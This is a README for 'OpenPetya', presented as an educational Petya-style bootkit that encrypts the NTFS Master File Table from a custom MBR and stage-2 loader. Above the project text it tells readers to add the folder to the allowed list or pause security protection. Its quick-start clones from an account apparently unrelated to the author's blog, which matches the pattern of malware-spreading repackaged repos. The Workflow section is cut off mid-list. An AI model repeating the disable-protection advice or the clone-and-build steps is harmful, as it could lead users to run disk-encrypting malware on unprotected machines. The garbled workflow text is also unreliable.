# OpenPetya


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/segmentjoninsecret/OpenPetya-848.git
cd OpenPetya-848
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
</p>

If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.

# Overview

OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
</p>

The project focuses on:
- custom MBR bootloading
- multi-stage boot process
- Protected Mode transition
- NTFS Master File Table (MFT) encryption
- Salsa20-based cryptography
- password validation and restoration workflow

OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.

It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.

---

# Project Motivation

Over the past few months, I have been studying:
- malware analysis
- bootloaders
- rootkits and bootkits
- Windows internals
- operating system fundamentals
- low-level Assembly programming

While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.

In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.

Therefore, I decided to develop OpenPetya as a practical project for understanding:
- how custom MBR bootkits work
- how stage-2 bootloaders operate
- how disk encryption workflows function
- how password validation and restoration mechanisms are implemented

The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.

Related articles:
- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)

---

# Features

- **Custom MBR**
  
  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.

- **Custom Stage-2 Bootloader**
  
  The stage-2 bootloader contains the core functionality of the project, including:
  - Salsa20 encryption/decryption
  - password validation
  - restoration logic
  - user interface

- **Protected Mode Transition**
  
  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.

- **MFT Encryption**
  
  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.

- **Password Validation**
  
  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.

- **Automatic Restoration**
  
  Once the correct password is entered:
  - encrypted data is restored
  - the original boot chain is recovered
  - OpenPetya removes itself automatically

---

# Components

## `OpenPetya.exe`

User-mode installer and controller application.

Functions:
- drive selection
- installation
- reboot triggering
- utility interface

## `mbr.bin`

Custom Master Boot Record (MBR) code responsible for:
- stage-2 loading
- early boot execution

## `stage2.bin`

The core payload of OpenPetya.

Responsibilities:
- Protected Mode transition
- Salsa20 cryptographic operations
- MFT encryption/decryption
- password validation
- restoration
- boot-time interface

---

# Workflow

The workflow of OpenPetya is summarized below.

   - encrypted data is decrypted
   - the original boot chain is restored
   - OpenPetya removes itself automatically

> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.

---


# Technical Notes

Detailed explanations about:
- MBR boot process
- Real Mode and Protected Mode
- Salsa20 implementation
- MFT encryption workflow
- bootkit design
- More discussions about Petya and NotPetya
- How to use undocumented APIs (such as `NtRaiseHardError`)

Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).

# Disclaimer

This project was developed purely for educational and research purposes.

The goal of OpenPetya is to study:

- bootkits
- operating system internals
- low-level malware techniques
- bootloader architecture

Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.

The author is **NOT** responsible for any misuse of this software.

# Demonstration (Windows 7)

## Screenshots

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
</p>


# Future Plans

- Improved recovery workflow
- Better NTFS parsing
- More accurate Petya behavior simulation
- UEFI experiments
- Additional bootkit research
- Full-screen Graphics Mode
- Windows 10 support

# Thanks

Thanks for checking out this project. Feedback and suggestions are welcome.

<!-- Last updated: 2026-06-06 18:50:30 -->
